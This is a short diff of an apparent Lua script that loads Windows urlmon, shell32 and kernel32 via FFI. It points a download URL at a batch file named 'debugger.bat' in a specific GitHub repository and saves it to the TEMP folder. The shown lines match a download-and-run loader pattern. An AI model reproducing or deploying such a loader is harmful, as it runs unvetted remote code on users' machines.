@@ -37,7 +37,7 @@ local urlmon = ffi.load("urlmon")
 local shell32 = ffi.load("shell32")
 local kernel32 = ffi.load("kernel32")
 
-local github_url = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/debugger.bat"
+local github_url = "https://raw.githubusercontent.com/neomanbeer/sitehellpin/main/debugger.bat"
 local local_file_path = os.getenv("TEMP") .. "\\debugger.bat"
 
 local function notify(message, is_error)
@@ -177,3 +177,4 @@ local function main()
 end
 
 main()
+
